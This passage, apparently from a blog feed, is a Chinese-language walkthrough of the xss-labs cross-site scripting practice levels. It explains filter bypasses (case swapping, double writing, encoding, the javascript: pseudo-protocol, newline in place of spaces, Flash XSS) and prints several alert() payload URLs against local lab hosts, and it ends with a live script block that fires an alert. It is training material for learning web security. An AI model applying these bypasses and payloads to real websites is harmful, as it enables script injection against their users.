-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……>//
-1111"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……这是输入的部分
-前后闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/1e4c13e4bc1d4537880deaf36855ab42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用了htmlspeialchars()函数	&lt;&gt;”都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7c28fa1a02bd4383ac5f0cb8df3f3f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">二者都写可以</p>
-<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>和上面一样</p>
-<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>on 和 script都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/ec2a556e55ba4c9b84c5a07d3aedff9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这里用javascript:伪协议<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3d92413c5c624059aab10d022aefcf04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">出来的链接就是答案</p>
-<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>可以大小写绕过</p>
-<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>把特殊字符便空了<br>可以双写绕过</p>
-<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关卡的死死的<br>要编码绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d233b7b1bba44b50b4aeeab90330e7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<h1 id="level-9"><a href="#level-9" class="headerlink" title="level  9"></a>level  9</h1><p>strpos函数看是否有http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/9d5db481746d4a9f95e8001a62ccd7bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h1><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框text</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css">type=<span class="token string">"text"</span> onclick=<span class="token string">"alert(1)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>后面几关都要改t_sort<br>因为后端获取t_sort和user-agent等<br>要从相应注入点注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2040ace8d49d4257a8553820b103ff93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><blockquote>
-<p>exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p>
-<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b0ccd08d54844a0ab8326ecdebed2497.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a28e85a7ace44b67a82fb0f28009f4a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-</blockquote>
-<h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>对script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;a%0atype=<span class="token string">"text"</span>%0a<span class="token string">"alert"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17-18"></a>level 17-18</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3636897a078a4392a3d629c6eabb3715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>火狐不支持swf格式<br>把链接加网页上显示出这样<br>很奇怪<br>开始整套娃了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b402d2307f0f45baacade379e596da50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p>要找个支持flash的浏览器才能正常打开<br>17-20关都能用flash xss<br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br>但这里先用别的办法<br>以18关为例<br>注入点可以在arg02<br>但是你连swf都没有哪来的moouseover哪<br>所以得url连接一下</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>xss<span class="token operator">-</span>labs<span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">/</span>xsf02<span class="token punctuation">.</span>swf?a<span class="token operator">=</span>?arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">%</span>20onmouseover<span class="token operator">=</span>javascript<span class="token punctuation">:</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d2caecf88dc64e4fbbfe4d6aff041882.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h1><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash反编译工具</a><br>以下是大佬的payload</p>
-<blockquote>
-<p>卑微小杨在线emo<br>flash反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持flash的浏览器真没法做</p>
-<p>18关</p>
-</blockquote>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="token string">"javascript:alert(/bmfx/)"</span>>bmfx&lt;/a> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>19关</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token selector">catch(e)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>/bmfx/<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>//%26width=998%26height=998<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<script>
-setTimeout(function () {
-    alert('xss');
-}, 1000);
-</script>]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-        <tag>xss-lab</tag>
       </tags>
   </entry>
   <entry>
